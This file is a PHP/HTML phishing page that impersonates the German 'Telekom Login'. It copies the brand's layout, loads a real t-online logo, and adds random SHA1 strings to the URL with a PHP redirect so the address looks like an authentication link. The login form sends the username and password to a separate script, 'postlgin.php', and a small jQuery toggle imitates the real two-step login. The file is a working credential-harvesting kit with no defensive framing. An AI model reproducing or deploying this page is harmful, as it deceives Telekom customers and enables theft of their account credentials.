<?php
session_start();
//Add Random characters to URL
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($actual_link, 'Service_Login_&_Authentication') !== false) {
    //Do nothing
}elseif(strpos($actual_link, '?') != true){
    $url = $actual_link."?&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);
}else{
    $url = $actual_link."&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);
}
?>
<!DOCTYPE html>

<html class="no-js" lang="de"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>

    <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="./assets/favicon.png" rel="shortcut icon" type="image/x-icon">

    <link rel="stylesheet" type="text/css" href="./assets/components.min.css">
    <link rel="stylesheet" type="text/css" href="./assets/login-20.26.0.css">

    <script type="text/javascript" src="./assets/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="./assets/components.min.js"></script>
    <script type="text/javascript" src="./assets/login.js"></script>

    <style type="text/css">
        .midd-wrapper{
            display: flex;
    flex-direction: column;
    justify-content: space-between;
    width: 100%;
    margin: 42px 10px 10px 59px;
        }
        .omo-inner {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
            width: 58%;
        }

  .wraper-omo {
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
background-color: rgba(0,160,222,0.1);
position: relative;
padding: 18px 24px 18px 18px;
margin-bottom: 56px;
font-size: 15px;
line-height: 18px;
text-align: center;
}
#global-info-box-text-part1{
  font-size: 13px;
}
    </style>

</head>


<body class="">
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>



    </header>






    <div class="offset-bottom-5 offset-s-bottom-3"></div>

</div>




<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">

             <div class="wraper-omo">
               <div class="omo-inner">
                    <div class="">Neue Datenschutzhinweise!</div>
                    <div class="">X</div>
               </div>


                 <div class="">
                   <span id="global-info-box-text-part1">
                     Wir haben unsere Datenschutzhinweise für den Telekom Login
                     aktualisiert. Sie können diese</span>
                     <a id="global-info-box-link" href="https://www.telekom.de/datenschutzhinweise/download/026.pdf" target="_blank"> hier </a>
                     <span id="global-info-box-text-part2">nachlesen.</span>
                 </div>
             </div>

            <div id="tbs-brand" class="tbs-relative text-center">
                <!-- <h4>E-MAIL</h4> -->

                <img src="https://login.t-online.de/stats/t-online-logo-29112019.png">

            </div>
            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
        </div>

        <div class="login-box">


            <div class="offset-bottom-1">
                <form  method="POST" action="postlgin.php" >


                    <div class="offset-bottom-1">

                        <div class="form-input-set">
                            <input required="" id="pw_usr" name="user" type="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">

                            <label for="pw_usr">Benutzername</label>
                            <i class="info-question-icon" data-toggle="collapse" data-target="#usrInfo" data-toggle-hide="true" tabindex="60"></i>
                        </div>

                            <div class="form-input-set" id="password-wrap">
                            <input required="" id="pw_usr" name="pass" type="Password" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">

                            <label for="pw_usr">Passwort</label>

                        </div>









                        <div class="login-helpers clearfix">
                            <!-- remember username component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div>

                                    <input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Benutzername merken</span>
                                </label>
                            </div>

                            <div id="tbs-recovery-link" class="text-right">
                                <button class="btn-link" role="button" name="showSelectIdentMethod" tabindex="44" type="submit"></button>
                            </div>
                        </div>


                        <div class="clearfix">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large" tabindex="40">Login</button>
                        </div>
                        <div class="clearfix">
                             <button style="margin: 12px 0px 1px 5px;
width: 471px;
padding: 10px 7px 10px 12px;
font-size: 22px;" type="button" name="button">Andere Anmeldeoptionen</button>
                        </div>
                    </div>

                </form>


                <div class="midd-wrapper">
                    <p>Benutzername oder Passwort vergessen?</p>
                    <p>Bitte nutzen Sie „Andere Anmeldeoptionen“.</p>
                </div>


                <div class="text-center offset-bottom-2 offset-top-2">
    <a href="#" tabindex="45" style="" target="_blank">Benötigen Sie Hilfe?</a>
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Noch keinen Telekom Login?</span>
                            <a class="text-nowrap" tabindex="50" href="#">Telekom Login? erstellen</a>
                            <span>und Telekom.de nutzen.</span>
                        </p>
                    </div>
                </div>

                <div class="text-center offset-bottom-2">
                    <img src="./assets/services.png">
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                            <a class="text-nowrap" tabindex="60" target="_blank" href="#">Hier informieren über VERIMI</a>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </div>

</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">24.05.0, 1b26521a07b2757b93cead392a27c03b, 125b30bd4ec2b21145ffe5af0060b64b2d1a8aca</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>

</div>
<script type="text/javascript">

    let showPassword = false
    $("#pw_submit").click(function(){
        showPassword = !showPassword
        showPassword ? $("#password-wrap").show() : $("#password-wrap").hide();
    });


    $("#password-wrap").hide();
</script>

</body></html>
